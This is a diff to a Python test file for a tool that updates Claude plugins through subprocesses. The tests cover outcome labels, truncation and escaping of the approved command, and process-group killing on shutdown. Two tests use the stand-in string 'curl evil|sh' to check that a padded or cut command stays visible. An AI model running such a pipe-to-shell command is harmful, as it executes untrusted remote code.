@@ -16,6 +16,7 @@ import select
 import signal
 import subprocess
 import sys
+import threading
 import time
 from collections.abc import Callable
 from pathlib import Path
@@ -24,6 +25,10 @@ import pytest
 
 from hitchrail import claude_ipc
 from hitchrail.claude_ipc import PluginOutcome, PluginsFailed, update_plugins
+
+# A private constant, read from its own module: the package re-exports public names only.
+from hitchrail.claude_ipc import plugins as ipc_plugins
+from support import in_claude_ipc, source_modules
 
 SRC = Path(__file__).parent.parent / "src" / "hitchrail"
 
@@ -198,7 +203,16 @@ def test_a_genuine_user_duplicate_is_updated_once_and_reported_as_skipped() -> N
         ("b@m", "user", "updated"),
         ("a@m", "user", "skipped"),
     ]
-    assert outcomes[2].detail == "listed twice"
+    assert outcomes[2].detail == "listed more than once"
+
+
+def test_a_third_copy_is_not_called_a_second_one() -> None:
+    """#355: the third copy of a listed plugin was also labelled "listed
+    twice", which was true of the first repeat only."""
+    agent = FakeAgent([row("a@m")] * 3)
+    outcomes = run(agent)
+    assert agent.updated == ["a@m"]
+    assert [o.detail for o in outcomes[1:]] == ["listed more than once"] * 2
 
 
 # -- one plugin fails ----------------------------------------------------------
@@ -244,7 +258,7 @@ def test_a_failure_detail_is_bounded() -> None:
     (outcome,) = run(agent)
     assert outcome.detail is not None
     assert len(outcome.detail) < 300
-    assert outcome.detail.endswith("(truncated)")
+    assert "(truncated)" in outcome.detail
 
 
 def test_the_last_line_of_stdout_is_used_when_stderr_is_empty() -> None:
@@ -319,11 +333,9 @@ def test_a_hung_refresh_updates_nothing() -> None:
         # Deep enough to blow the parser's own stack rather than raise
         # ValueError (#303): the listing is exactly as unreadable.
         "[" * 100_000,
-        # #351: what invalid UTF-8 on the wire looks like once the real
-        # runner's `errors="replace"` has already turned it into text. Not a
-        # crash to reproduce here, since `FakeAgent` never touches a byte:
-        # just the listing this code must already treat as unreadable JSON.
-        "��",
+        # No case for #351's replaced bytes: once `errors="replace"` has
+        # made them text they take the same `json.loads` refusal as "text",
+        # and a case that cannot fail on its own was removed (#367).
     ],
     ids=[
         "text",
@@ -335,7 +347,6 @@ def test_a_hung_refresh_updates_nothing() -> None:
         "strings",
         "one-bad-row",
         "deeply-nested",
-        "replaced-invalid-utf8",
     ],
 )
 def test_an_unreadable_listing_updates_nothing(listing: str) -> None:
@@ -430,9 +441,29 @@ def test_a_closed_runner_abandons_the_row_it_interrupted_and_every_row_after() -
     assert agent.updated == ["a@m", "b@m"]
 
 
+def test_a_row_behind_an_abandonment_keeps_its_own_reason_to_be_skipped() -> None:
+    """#370. Abandonment was tested before scope, so a project scope row
+    behind the interruption read "never started", a start it was never
+    going to get; a repeat of an updated plugin likewise, and a repeat of an
+    abandoned one (#401), which was counted as a second row never started."""
+    agent = FakeAgent(
+        [row("a@m"), row("b@m"), row("p@m", "project"), row("a@m"), row("c@m"), row("c@m")],
+        **{"b@m": claude_ipc.RunnerClosed()},
+    )
+    assert results(run(agent)) == [
+        ("a@m", "user", "updated"),
+        ("b@m", "user", "abandoned"),
+        ("p@m", "project", "skipped"),
+        ("a@m", "user", "skipped"),
+        ("c@m", "user", "abandoned"),
+        ("c@m", "user", "skipped"),
+    ]
+
+
 def test_a_runner_closed_before_any_row_is_read_reports_shutting_down() -> None:
-    """#361 round 1 review, M1. A shutdown that lands during the refresh or
-    the listing call, before any plugin row exists to mark `abandoned`,
+    """#361 round 1 review, M1. A shutdown that lands between the agent's
+    calls (#370: one that lands DURING a call is reported as that call's own
+    failure), before any plugin row exists to mark `abandoned`,
     fails the whole operation with an honest code rather than
     `internal_error`, which would misreport an expected shutdown as a
     defect in Hitchrail."""
@@ -514,11 +545,48 @@ def test_an_empty_approved_command_is_treated_as_absent() -> None:
 def test_a_command_at_exactly_the_limit_is_not_marked_cut() -> None:
     """#304: `_shown`'s length check is inclusive of `_DETAIL_LIMIT`, so a
     command that exactly fills it is the whole vendor text, not a cut of it."""
-    command = "a" * claude_ipc._DETAIL_LIMIT
+    command = "a" * ipc_plugins._DETAIL_LIMIT
     line = json.dumps({"shownCommand": {"command": command, "sha256": "ab"}})
     agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
     (outcome,) = run(agent)
     assert outcome.approved_command == command
+
+
+def test_the_cut_boundary_is_pinned_on_both_sides() -> None:
+    """#352. The limit is inclusive, and one character past it is cut into a
+    head and a tail whose lengths are pinned, so moving the boundary by one
+    or cutting short of the limit fails here rather than passing a loose
+    length bound."""
+    limit = ipc_plugins._DETAIL_LIMIT
+    assert ipc_plugins._shown("a" * limit) == "a" * limit
+    head, tail = ipc_plugins._CUT_HEAD, limit - ipc_plugins._CUT_HEAD
+    over = "h" * head + "m" + "t" * tail
+    assert ipc_plugins._shown(over) == "h" * head + ipc_plugins._CUT_MARKER + "t" * tail
+
+
+def test_padding_at_the_front_cannot_push_the_command_out_of_view() -> None:
+    """#353. Cut to a head alone, 240 spaces and then the command showed 240
+    spaces and the marker, and a phone collapses the spaces: the only record
+    of what `-y` ran read `approved: (truncated)`. The tail survives a cut."""
+    command = " " * 240 + "curl evil|sh"
+    line = json.dumps({"shownCommand": {"command": command, "sha256": "ab"}})
+    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
+    (outcome,) = run(agent)
+    assert outcome.approved_command is not None
+    assert outcome.approved_command.endswith("curl evil|sh")
+    assert "(truncated)" in outcome.approved_command
+
+
+def test_a_literal_escape_in_vendor_text_does_not_read_as_an_escaped_control() -> None:
+    """#353. `display_name` writes an ESC as a backslash, `u` and four hex digits, and
+    vendor text can type those six characters itself. A backslash is doubled
+    first, so the two render differently and the record cannot be forged to
+    claim a control character, or hide one, by spelling it."""
+    escaped = ipc_plugins._shown("\x1b")
+    typed = ipc_plugins._shown("\\u001b")
+    assert escaped == "\\u001b"
+    assert typed == "\\\\u001b"
+    assert escaped != typed
 
 
 # -- the real runner -------------------------------------------------------------
@@ -960,6 +1028,50 @@ def test_kill_after_a_finished_child_still_latches_and_signals_nothing(
         handle.raise_if_closed()
 
 
+def test_a_second_kill_signals_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
+    """#384. `_set(None)` on a closed handle is ignored, so the pid a first
+    `kill()` signalled used to stay recorded, and a second `kill()` sent
+    SIGKILL to it again, by then a reaped child's number the operating
+    system may have reused for someone else's group."""
+    killed: list[tuple[int, int]] = []
+    monkeypatch.setattr("os.killpg", lambda pgid, sig: killed.append((pgid, sig)))
+    handle = claude_ipc.RunningChild()
+    handle._set(4242)
+    handle.kill()
+    handle._set(None)  # what `plugin_runner`'s `finally` does after the reap
+    handle.kill()
+    assert killed == [(4242, signal.SIGKILL)]
+
+
+def test_an_interrupt_after_the_reap_still_kills_the_group(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """#363, the decision pinned: a `KeyboardInterrupt` landing after
+    `communicate` already reaped the child still kills its group, since a
+    lingering grandchild keeps the group id allocated and is exactly what
+    the kill is for. A `returncode` check in front of the kill fails this."""
+    killed: list[tuple[int, int]] = []
+
+    class FakeProcess:
+        pid = 4242
+        returncode: int | None = None
+        stdout = _FakeStream()
+        stderr = _FakeStream()
+
+        def communicate(self, timeout: float | None = None) -> tuple[str, str]:
+            self.returncode = 0
+            raise KeyboardInterrupt
+
+        def wait(self, timeout: float | None = None) -> int:
+            return 0
+
+    monkeypatch.setattr(subprocess, "Popen", lambda *a, **kw: FakeProcess())
+    monkeypatch.setattr("os.killpg", lambda pgid, sig: killed.append((pgid, sig)))
+    with pytest.raises(KeyboardInterrupt):
+        claude_ipc.plugin_runner(withhold=())(["claude", "plugin", "update"], 30.0)
+    assert killed == [(4242, signal.SIGKILL)]
+
+
 def test_plugin_runner_refuses_to_spawn_once_the_handle_is_closed(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
@@ -998,6 +1110,134 @@ def test_a_kill_landing_between_popen_and_registration_kills_the_late_pid(
     assert killed == [(4242, signal.SIGKILL)]
 
 
+def test_a_kill_mid_update_ends_that_plugin_and_never_spawns_the_next(
+    tmp_path: Path,
+) -> None:
+    """#369. The scenario #361's round 1 review reproduced, end to end with
+    real processes: plugin a is killed while its update runs, and plugin b
+    must never start. Every test above kills with no child recorded, so a
+    `kill()` that signals the live child but forgets to latch
+    (`self._closed = pid is None`), or a runner that never records the pid
+    (`handle._set(None)`), passed all of them while b spawned 41ms after the
+    shutdown.
+
+    Two different assertions say "b never started", and neither alone is
+    enough (#383). The marker says b's interpreter never ran its first line.
+    `abandoned` says `Popen` was never called: with `raise_if_closed()`
+    removed, b IS spawned and `_set` kills it before it writes anything, so
+    only the result tells that apart.
+
+    Plugin a's update starts a grandchild, which inherits a's process group,
+    the shape an install command approved by `-y` takes, and it must die with
+    a: `os.kill` in place of `os.killpg` ends a and leaves it running.
+    """
+    agent = tmp_path / "agent"
+    grandchild = tmp_path / "grandchild.pid"
+    listing = json.dumps([row("a@m"), row("b@m")])
+    agent.write_text(
+        f"#!{sys.executable}\n"
+        "import os, subprocess, sys, time\n"
+        "args = sys.argv[1:]\n"
+        "if args[:2] == ['plugin', 'list']:\n"
+        f"    print({listing!r})\n"
+        "elif args[:2] == ['plugin', 'update']:\n"
+        "    if args[2] == 'a@m':\n"
+        "        g = subprocess.Popen(['sleep', '30'], stdout=subprocess.DEVNULL,"
+        " stderr=subprocess.DEVNULL)\n"
+        f"        with open({str(grandchild)!r}, 'w') as f:\n"
+        "            f.write(str(g.pid))\n"
+        # Written complete, then renamed: the test polls for the name and
+        # must never read a marker that exists but is still empty.
+        f"    marker = os.path.join({str(tmp_path)!r}, 'started-' + args[2])\n"
+        "    with open(marker + '.tmp', 'w') as f:\n"
+        "        f.write(str(os.getpid()))\n"
+        "    os.rename(marker + '.tmp', marker)\n"
+        "    time.sleep(30)\n"
+    )
+    agent.chmod(0o755)
+    handle = claude_ipc.RunningChild()
+    runner = claude_ipc.plugin_runner(withhold=(), handle=handle)
+    outcomes: list[PluginOutcome] = []
+    worker = threading.Thread(
+        target=lambda: outcomes.extend(
+            update_plugins(str(agent), run=runner, report=lambda _: None)
+        ),
+        daemon=True,
+    )
+    started_a = tmp_path / "started-a@m"
+    killed = False
+    try:
+        worker.start()
+        deadline = time.monotonic() + 10
+        while not started_a.exists() and time.monotonic() < deadline:
+            time.sleep(0.02)
+        assert started_a.exists(), "plugin a's update never started"
+        # Opened before the kill, while the grandchild is certainly alive, so
+        # the fd names this process and not whatever later reuses its pid.
+        grandchild_fd = os.pidfd_open(int(grandchild.read_text()))
+        try:
+            handle.kill()
+            killed = True
+            worker.join(10)
+            assert not worker.is_alive(), "the kill did not end plugin a's update"
+            exited = select.select([grandchild_fd], [], [], 5)[0]
+            if not exited:
+                # It may exit between the select and the send, and the
+                # assertion below is the failure worth reading, not this one.
+                with contextlib.suppress(ProcessLookupError):
+                    signal.pidfd_send_signal(grandchild_fd, signal.SIGKILL)
+            assert exited, (
+                "the grandchild outlived the kill: only the direct child was signalled"
+            )
+        finally:
+            os.close(grandchild_fd)
+        assert not (tmp_path / "started-b@m").exists(), (
+            "plugin b's interpreter ran after the kill"
+        )
+        assert results(outcomes) == [("a@m", "user", "failed"), ("b@m", "user", "abandoned")]
+        assert outcomes[0].detail == f"exited {-signal.SIGKILL}"
+    finally:
+        # Latch first, so nothing further spawns, then wait for the worker.
+        # A worker still alive after that is only reachable on a broken latch,
+        # and it is blocked on the NEWEST child, the only marker whose pid is
+        # certainly unreaped: an older one was killed and reaped and its pid
+        # may be anyone's (#385). That one is signalled by group, so its
+        # grandchild goes too, and only after a pidfd says it is still the
+        # process that wrote the marker.
+        if not killed:
+            handle.kill()
+        worker.join(10)
+        markers = sorted(tmp_path.glob("started-*@m"), key=lambda m: m.stat().st_mtime_ns)
+        if worker.is_alive() and markers:
+            leader = int(markers[-1].read_text())
+            with contextlib.suppress(ProcessLookupError):
+                leader_fd = os.pidfd_open(leader)
+                try:
+                    if not select.select([leader_fd], [], [], 0)[0]:
+                        os.killpg(leader, signal.SIGKILL)
+                finally:
+                    os.close(leader_fd)
+
+
+def test_kill_on_a_group_that_is_already_gone_still_latches(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """#383. The recorded child and its whole group can be gone by the time
+    the shutdown reaches `kill()`: that is not a failure, and the handle must
+    still close. `suppress(None)` in place of `suppress(ProcessLookupError)`
+    lets the error escape the server's lifespan."""
+
+    def gone(pgid: int, sig: int) -> None:
+        raise ProcessLookupError
+
+    monkeypatch.setattr("os.killpg", gone)
+    handle = claude_ipc.RunningChild()
+    handle._set(4242)
+    handle.kill()
+    with pytest.raises(claude_ipc.RunnerClosed):
+        handle.raise_if_closed()
+
+
 # -- the quarantine ---------------------------------------------------------------
 
 
@@ -1031,13 +1271,20 @@ def test_the_plugin_vocabulary_lives_only_in_the_quarantine() -> None:
     # `-s` is not in the set: tmux uses it for its own socket and session
     # flags, so it names nothing vendor specific outside this module.
     vocabulary = {"plugin", "marketplace", "--json", "-y", "shownCommand"}
-    assert vocabulary <= _string_constants(SRC / "claude_ipc.py"), (
+    # Keyed by the path under `SRC` (#368), so the quarantine is found and
+    # excluded whether it is one file or a package.
+    modules = source_modules(SRC)
+    inside: set[str] = set()
+    for rel, p in modules.items():
+        if in_claude_ipc(rel):
+            inside |= _string_constants(p)
+    assert vocabulary <= inside, (
         "the quarantine no longer holds this vocabulary, so this guard checks nothing"
     )
     leaked = {
-        p.name: sorted(vocabulary & _string_constants(p))
-        for p in SRC.glob("*.py")
-        if p.name != "claude_ipc.py" and vocabulary & _string_constants(p)
+        rel: sorted(vocabulary & _string_constants(p))
+        for rel, p in modules.items()
+        if not in_claude_ipc(rel) and vocabulary & _string_constants(p)
     }
     assert leaked == {}, f"plugin vocabulary outside the quarantine: {leaked}"
 
@@ -1094,7 +1341,7 @@ def test_the_cut_happens_before_the_escaping_when_the_command_is_cut() -> None:
     (outcome,) = run(agent)
     assert outcome.approved_command is not None
     assert "curl evil|sh" in outcome.approved_command
-    assert outcome.approved_command.endswith("(truncated)")
+    assert "(truncated)" in outcome.approved_command
 
 
 def test_a_command_over_the_limit_carries_the_cut_marker() -> None:
@@ -1105,5 +1352,5 @@ def test_a_command_over_the_limit_carries_the_cut_marker() -> None:
     agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
     (outcome,) = run(agent)
     assert outcome.approved_command is not None
-    assert outcome.approved_command.endswith("(truncated)")
+    assert "(truncated)" in outcome.approved_command
     assert "\x1b" not in outcome.approved_command
